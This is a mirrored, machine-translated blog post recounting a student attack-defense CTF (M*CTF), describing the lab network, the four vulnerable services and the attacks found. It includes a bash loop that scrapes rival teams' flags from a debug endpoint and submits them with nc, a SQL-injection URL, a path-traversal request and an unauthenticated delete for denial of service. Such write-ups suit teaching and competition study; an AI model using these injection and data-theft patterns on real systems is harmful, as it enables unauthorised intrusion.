<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Scrapbook with M * CTF</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day! In this small opus, I would like to tell with the participant‚Äôs eyes how the CTF type of attack defenses take place and, in particular, to h...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Scrapbook with M * CTF</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://pp.vk.me/c626930/v626930420/21cc8/a0seSr6aAFQ.jpg" alt="mctf"></p><br><p>  Good day!  In this small opus, I would like to tell with the participant‚Äôs eyes how the CTF type of attack defenses take place and, in particular, to highlight the past <a href="http://mctf.aciso.ru/">m * ctf competition</a> .  But before all this, I would like to thank my <a href="https://habrahabr.ru/company/innopolis_university/">Innopolis University</a> for the opportunity to attend this (and many other) events. </p><br><p>  Under the cut, both organizational and technical details of past competitions.  And of course, many, many photos! </p><a name="habracut"></a><br><h2 id="ctf">  CTF </h2><br><p><img src="https://pp.vk.me/c836438/v836438481/12bc9/0gBKBy_eqPs.jpg" alt="guest-team"></p><br><p>  <abbr title="Capture the Flag">CTF</abbr> is a computer security team competition and is divided into two types. </p><br><p>  The first (aka jeopardy or task-based) is a set of independent tasks of various nature.  As a rule, the main categories are singled out: cryptography, steganography, reverse, fornica, admin.  Whoever scores the most points in the allotted time is the good one (an example of a recent event is <a href="https://habrahabr.ru/company/bizone/blog/315026/">CT.From Bi.Zone</a> ) </p><br><p>  The second type (he is attack-defense) is a much more interesting and rare event.  Each team is given a vulnerable image (it is identical for all teams), which contains several services.  Each of these services in any way works with strings, which are called flags.  As the name suggests, participants need to drag them through service vulnerabilities.  And in addition to this and protect their own.  A similar competition was M * CTF. </p><br><h2 id="mctf">  M * CTF </h2><br><p><img src="https://pp.vk.me/c836438/v836438908/11c48/Aimz0AcyPoo.jpg" alt="people"></p><br><p>  M * CTF is a competition for students of Moscow universities, which are held already 3 times, this time on the basis of MTUCI.  By luck, I managed to get into the guest team and enjoy the competition. </p><br><h3 id="den-lekciy">  Lecture day </h3><br><p>  The first day was overshadowed by an early rise (but the second was not very different).  On this day, teams were registered and, most importantly, lectures were given (by the way, open to all) from partners.  And the organizers tried to dispel a serious situation with a small contest.  The lecture program looked like this: </p><br><p><img src="https://pp.vk.me/c626219/v626219516/455cd/Cep_whyRGqI.jpg" alt="lectures"></p><br><p>  Thanks to <a href="https://habrahabr.ru/users/ptsecurity/" class="user_link">ptsecurity</a> , <a href="https://habrahabr.ru/users/infotecs/" class="user_link">Infotecs</a> , <a href="https://habrahabr.ru/company/group-ib/">Group-IB,</a> and speakers from other organizations. </p><br><h3 id="den-sorevnovaniy">  Competition day </h3><br><h4 id="set">  Network </h4><br><p>  Before the start of the competition, we were given grid configs for the team with the number N (mine was 21, then it will be used): </p><br><ul><li>  Grid: 10.60.N.1 / 24 </li><li>  Gateway: 10.60.N.1 </li><li>  Services should be available by: 10.60.N.2 </li><li>  Available for other IP commands: 10.60.N.0 / 25 </li><li>  Unavailable to other IP commands: 10.60.N.128 / 25 </li><li>  Host for checking flags: 10.10.40.2:8080 </li></ul><br><p>  Then the most interesting thing began - they started handing out flash drives with images.  Ironically, about 90% of flash drives contained broken archives, so a bit later an image was posted on a <a href="https://drive.google.com/file/d/0B0GA6y7BRc-Da2Q0czhWenk2Rnc/view">gugldok</a> .  CTF would not be CTF if there were no similar incidents on them. </p><br><p><img src="https://pp.vk.me/c836438/v836438463/129aa/LsXdFAuUTyc.jpg" alt="facepalm"></p><br><p>  Since I played practically one there was no one to delegate tasks, therefore all the actions below should be carried out in parallel by different team members.  Then there is a very small chance that you will be in time :) </p><br><h4 id="pervye-shagi">  The first steps </h4><br><br><p>  The first thing to do is, of course, get into an image and see what lies there.  But, alas, he got to me very late, so the first preparations were connected with the net.  There is nothing magical and difficult in this, but the problem arises when you need "here, now and in order to work," and mana under the age-old layer of dust has long been forgotten. </p><br><pre><code class="bash hljs">ip aa 10.60.21.135/24 dev eth0 ip ra default via 10.60.21.1 dev eth0</code> </pre> <br><p>  In general, this is all, the main thing is not to forget to turn off the dhcp client (or raise your own) so that it does not reset the settings.  And, of course, it‚Äôs worth registering ns-servers to go online: </p><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> -e <span class="hljs-string"><span class="hljs-string">"nameserver 8.8.8.8\nnameserver 8.8.4.4"</span></span> &gt;/etc/resolv.conf</code> </pre> <br><h4 id="to-s-chego-stoilo-nachat">  Things to start with </h4><br><p>  After some time, the cherished image of <em>mctf.ova</em> came to me and I happily opened it in a <em>virtual machine</em> .  The experimental turned out to be 64-bit Debian, hungry for only 1 GB of RAM.  A blue screen with a GRUB appears on the first flank of the defense: </p><br><p><img src="https://habrastorage.org/files/2f3/17c/766/2f317c766f114907b9bc8e4facdee37a.png" alt="grub"></p><br><p>  Passwords from users in this case are not specified, but, good, we have the usual grub, which means we can easily change the record of the loader.  After loading, we change the password as root and reboot, remembering to pre-add the launch of <strong>/ bin / bash</strong> : </p><br><p><img src="https://habrastorage.org/files/588/091/4a0/5880914a040d4e4dab53412549a22491.png" alt="grub-bash"></p><br><p>  Next, it makes sense to install a Bridged network adapter and configure the network within the image. </p><br><p>  In general, it is worth noting that you can complicate your life a little and honestly make a NAT adapter with the right forwarding and filtering, and also wind up some IDF on the intermediary gateway, but in fact it is rarely necessary. </p><br><p>  Inside the image itself, the grid is configured for 4 commands, so it needs to be corrected: </p><br><pre> <code class="bash hljs">ip af dev eth0 ip aa 10.60.21.2/24 dev eth0 ip ra default via 10.60.21.1 dev eth0</code> </pre> <br><h4 id="i-esche-nemnogo-pro-set">  And a little more about the network </h4><br><p>  Before turning to the most interesting, it is worth mentioning the wonderful possibility of finding vulnerabilities - network traffic analysis using wireshark or any other tool you know.  As you probably understand, you can monitor the traffic that comes to you and there will most likely be requests from the organizers and from rivals. </p><br><p>  I had enough for 4 series of <a href="https://drive.google.com/open%3Fid%3D0B2pOLqHDzXr7VUtEd25xX0M3X28">dumps</a> (~ 3GB), but, alas, one of them was irretrievably lost due to an unplanned reboot (I hope there are no passwords accidentally merged :).  Personally, I prefer to run the GUI and periodically look there, although you can get along with such a command, if you feel sorry for the memory: </p><br><pre> <code class="bash hljs">tshark -i eth0 -w traf1.pcap</code> </pre> <br><p>  It‚Äôs probably worth automating the process of creating new files, but you had to think about it beforehand.  In the process of the game itself is usually not up to it. </p><br><p><img src="https://pp.vk.me/c836438/v836438574/13e8e/NMfMBGL6QsI.jpg" alt="another-team"></p><br><p>  In addition to finding vulnerabilities in traffic, you can also analyze the packages of the organizers (at the beginning of the game, as a rule, the main traffic comes from them).  Here, for example, you can define the User-Agent of the organizers and thus can filter the remaining packages from the players.  Here you can also determine the format of the flag, as well as which ports and by which protocol it arrives. </p><br><h4 id="glyadim-v-obrazy">  We look at the images </h4><br><p>  And finally the most interesting!  We only had 4 services and they are spinning in docker containers.  You can view information about available images and rotating containers for example: </p><br><pre> <code class="bash hljs">docker ps &amp;&amp; docker images</code> </pre> <br><p><img src="https://habrastorage.org/files/d64/a1b/892/d64a1b8922994ea0b68fbfca1f9123f7.png" alt="docker"></p><br><p>  Here we can notice 4 services: <strong>voicemail</strong> (port 2222, for some reason it is not shown in the list), <strong>drdre</strong> (port 3333), <strong>mis</strong> (port 8080), <strong>poke</strong> (port 8090). </p><br><p>  To analyze the service we need to go to the docker container, and then find and download the necessary files from there. </p><br><pre> <code class="bash hljs">docker <span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> -it mctf-&lt;service&gt; /bin/bash</code> </pre> <br><p>  A small note before the review of services: there was no analysis of the tasks after the competition and the further description of the services is what I managed to dig in those 8 hours and what I could find out in the process of communicating with other teams after the game.  This means that in each of the services there are most likely still (and many!) Exploited vulnerabilities, so I would be extremely grateful for the additions. </p><br><h5 id="voicemail">  Voicemail </h5><br><p><img src="https://habrastorage.org/files/108/7b8/986/1087b8986de14faf80b29f6a7890bbf6.png" alt="voicemail"></p><br><p>  The first service is for sending voice messages using <abbr title="Session initiation protocol">SIP</abbr> based on the <a href="https://www.freeswitch.org/">freeswitch</a> library and all low-level things happen there.  The library has been installed fairly fresh and there are no ready exploits for it under open access, so studying it seemed like a waste of time. </p><br><p>  Web requests are processed by a single <em>voicemail.py</em> file, which is a simple server on <a href="http://flask.pocoo.org/">Flask</a> .  So all services are the same, so the <strong>app.config ['DEBUG'] = true</strong> parameter is set for all and the secret key is the same. </p><br><p>  Another interesting thing is that the already mentioned library creates <em>/var/www/voicemail/static/freeswitch.log</em> , which is not processed separately in <em>voicemail.py</em> .  Why is it important?  Flags should fall into this log (according to other participants), although I could not find any of the traffic dumps and requests to the services of other teams. </p><br><h5 id="drdre">  Drdre </h5><br><p><img src="https://habrastorage.org/files/0ef/4fd/c81/0ef4fdc81dd94ebf9d6797f71629ab3b.png" alt="drdre"></p><br><p>  The second service is a monstrous (although there are not so many useful files there) <a href="http://tomcat.apache.org/">Tomcat-</a> server.  It acts as an antivirus company site.  You can download Dr.Dre anti-virus from it or check malware similarly to virustotal.  Most likely, after sending this file, it was launched by an antivirus, with which it was possible to get some ill-fated <abbr title="Remote code execution">RCE</abbr> . </p><br><p>  This was actually one of those services, the vulnerability to which I discovered in traffic.  The requests went to <a href="http://10.60.21.2:3333/stat%3Fdebug%3Dtrue">http://10.60.21.2</a> ŸÑ333/stat?debug= <a href="http://10.60.21.2:3333/stat%3Fdebug%3Dtrue">true</a> , without thinking twice, go in there and see (or not see, you don‚Äôt have flags :) lines suspiciously resembling a flag.  A small script for passing flags could look like this: </p><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash for i in $(seq 1 20); do wget -q "http://10.60.$i.2:3333/stat?debug=true" -O file --timeout=2 for i in $(egrep -o "[a-zA-Z0-9]{40}=" file); do echo $i | nc 10.10.40.2 8080 | grep -i "input flag" sleep 1 done done</span></span></code> </pre> <br><h5 id="mis-aka-private-messanger">  MIS (aka Private Messanger) </h5><br><p><img src="https://habrastorage.org/files/0fc/5ea/61b/0fc5ea61b2e54684b4cf46a89f451245.png" alt="mis"></p><br><p>  The third service is a php server with low-level communication with the database through bare sockets.  It allows you to encrypt text using the image 100x100px.  The key gets from the low bits of the R-channel, the total key goes up to 10,000 bits.  The ciphertext is issued using an exclusive or between a flag, a previously known salt and a key.  I tried to look at examples of keys, but, alas, it looked as if they were generated randomly.  Although one unconfirmed and not disproved guess was still: it is likely that the keys could be used for all the commands the same.  Then, with the knowledge of salt and key, one could get a flag. </p><br><p>  The first attack was of the DoS type and was carried out quite simply.  When requesting the removal of a message (flag), it was only the password that was checked, not its correctness.  Total request type <strong>GET /delete.php?id=&lt;id&gt;&amp;pass=0&amp;ask=Y</strong> could remove the opponent's flags and thereby cause him to lose precious points. </p><br><p>  The second attack went on injecting requests to mysql through bare sockets.  The request in the service went as follows: <strong>P \ t999 \ tservice1 \ ttext \ tPRIMARY \ tid, pass, text \ n999 \ t = \ t1 \ t $ _GET [id] \ n</strong> , thus it was possible to pick up the string and get full access to bd </p><br><h5 id="poke">  Poke </h5><br><p><img src="https://habrastorage.org/files/2c2/729/dbb/2c2729dbba2c491a80b23b809b10b07c.png" alt="poke"></p><br><p>  The last service is also implemented in php.  It prompts the user to select a pokemon and wander around the map in search of battles.  After a certain number of victories, a flag is sent.  This service apparently was the most leaky of all.  In fact, battles can be carried out without meeting an opponent; you only need to know his nickname.  One of the vulnerabilities is trivial sqli wherever possible. </p><br><p>  For example, the query: <strong>/battle.php?to=qzqzqqz'%20union%20select%20username%20from</strong> <br>  <strong>% 20users% 20limit% 2012345.1% 20 -% 201</strong> will give the user name 12345. Next, by the query "/class/database/users/&lt;nick&gt;/flag.jpg" we get the necessary flag.  It could have been even simpler: the query "/class/database/users.db" produced a whole sqlite database, from which, besides the list of users, you can also get password hashes and many other interesting things.  But if suddenly you just want to play, but not with anyone, then you can just go to <strong>/battle.php?to=../users/</strong> </p><br><h4 id="i-esche-paru-slov-pro-okonchanie">  And a few words about the ending </h4><br><p><img src="https://pp.vk.me/c836438/v836438898/153d7/axSK8dMA23E.jpg" alt="cup"></p><br><p>  An hour before the end of the competition (deliberately) access to the table with points was closed, and thus, the intrigue remained who would win.  It was extremely unexpected to see in the first place a team from the HSE, which previously occupied the 2nd place.  And the final hacker-scorbord, in the console (and not because the server fell): </p><br><p><img src="https://habrastorage.org/files/7c2/fea/482/7c2fea482ef34ef488469780c995e7cb.jpg" alt="scoreboard"></p><br><p>  I would like to express my <a href="http://ctfnews.ru/">deep</a> gratitude to the <a href="http://ctfnews.ru/">ctfnews</a> community for the support of the competitions themselves and for the photos.  The rest, by the way, can be found in the <a href="https://vk.com/album-81868406_239256102">album VC</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/317336/">https://habr.com/ru/post/317336/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317322/index.html">Pentest at Global Data Security - passing the 10th Pentestit Lab</a></li>
<li><a href="../317326/index.html">Ruby code coverage analysis</a></li>
<li><a href="../317328/index.html">Performance comparison of GPU calculations in Python and C</a></li>
<li><a href="../317332/index.html">Communication strategy as a tool for building a career and personal brand</a></li>
<li><a href="../317334/index.html">The digest of interesting materials for the mobile # 183 developer (December 5-11)</a></li>
<li><a href="../317338/index.html">Set up Swashbuckle (Swagger) for WebAPI</a></li>
<li><a href="../317340/index.html">How I chose the GTD system for IT using the Wunderlist example</a></li>
<li><a href="../317344/index.html">Adizes PAEI Management Styles and Scrum Roles</a></li>
<li><a href="../317346/index.html">VulnHub 64Base Simple Solution: Boot2Root</a></li>
<li><a href="../317348/index.html">Parallel fast sorting on Haskell and how hard it turned out to write</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>